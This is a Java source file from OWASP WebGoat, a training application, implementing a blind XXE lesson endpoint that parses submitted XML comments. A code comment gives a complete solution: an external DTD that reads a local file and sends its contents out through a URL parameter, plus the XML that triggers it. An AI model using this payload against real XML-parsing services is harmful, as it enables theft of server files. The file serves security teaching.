package org.owasp.webgoat.plugin;

import com.beust.jcommander.internal.Lists;
import com.google.common.base.Joiner;
import lombok.SneakyThrows;
import org.owasp.webgoat.assignments.AssignmentEndpoint;
import org.owasp.webgoat.assignments.AssignmentPath;
import org.owasp.webgoat.assignments.AttackResult;
import org.owasp.webgoat.session.WebSession;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.io.ClassPathResource;
import org.springframework.http.MediaType;
import org.springframework.util.FileCopyUtils;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.annotation.PostConstruct;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;

/**
 * ************************************************************************************************
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details,
 * please see http://www.owasp.org/
 * <p>
 * Copyright (c) 2002 - 20014 Bruce Mayhew
 * <p>
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 * <p>
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 * <p>
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 * <p>
 * Getting Source ==============
 * <p>
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software
 * projects.
 * <p>
 *
 * @author nbaars
 * @version $Id: $Id
 * @since November 18, 2016
 */
@AssignmentPath("xxe/blind")
public class BlindSendFileAssignment extends AssignmentEndpoint {

    @Value("${webgoat.user.directory}")
    private String webGoatHomeDirectory;
    @Autowired
    private Comments comments;
    @Autowired
    private WebSession webSession;

    @PostConstruct
    @SneakyThrows
    public void copyFile() {
        ClassPathResource classPathResource = new ClassPathResource("secret.txt");
        File targetDirectory = new File(webGoatHomeDirectory, "/XXE");
        if (!targetDirectory.exists()) {
            targetDirectory.mkdir();
        }
        FileCopyUtils.copy(classPathResource.getInputStream(), new FileOutputStream(new File(targetDirectory, "secret.txt")));
    }

    @RequestMapping(method = RequestMethod.POST, consumes = MediaType.ALL_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)
    @ResponseBody
    public AttackResult addComment(@RequestBody String commentStr) throws Exception {
        String error = "Parsing successful contents not send to attacker";
        try {
            Comment comment = comments.parseXml(commentStr);
            comments.addComment(comment, false);
        } catch (Exception e) {
            error = e.toString();
        }

        File logFile = new File(webGoatHomeDirectory, "/XXE/log" + webSession.getUserName() + ".txt");
        List<String> lines = logFile.exists() ? Files.readAllLines(Paths.get(logFile.toURI())) : Lists.newArrayList();
        boolean solved = lines.stream().filter(l -> l.contains("WebGoat 8 rocks...")).findFirst().isPresent();
        if (solved) {
            logFile.delete();
            return trackProgress(success().output("xxe.blind.output").outputArgs(Joiner.on('\n').join(lines)).build());
        } else {
            return trackProgress(failed().output(error).build());
        }
    }

    /**
     * Solution:
     *
     * Create DTD:
     *
     * <pre>
     *     <?xml version="1.0" encoding="UTF-8"?>
     *     <!ENTITY % file SYSTEM "file:///c:/windows-version.txt">
     *     <!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8080/WebGoat/XXE/ping?text=%file;'>">
     *      %all;
     * </pre>
     *
     * This will be reduced to:
     *
     * <pre>
     *     <!ENTITY send SYSTEM 'http://localhost:8080/WebGoat/XXE/ping?text=[contents_file]'>
     * </pre>
     *
     * Wire it all up in the xml send to the server:
     *
     * <pre>
     *  <?xml version="1.0"?>
     *  <!DOCTYPE root [
     *  <!ENTITY % remote SYSTEM "http://localhost:8080/WebGoat/plugin_lessons/XXE/test.dtd">
     *  %remote;
     *   ]>
     *  <user>
     *    <username>test&send;</username>
     *  </user>
     *
     * </pre>
     *
     */
}
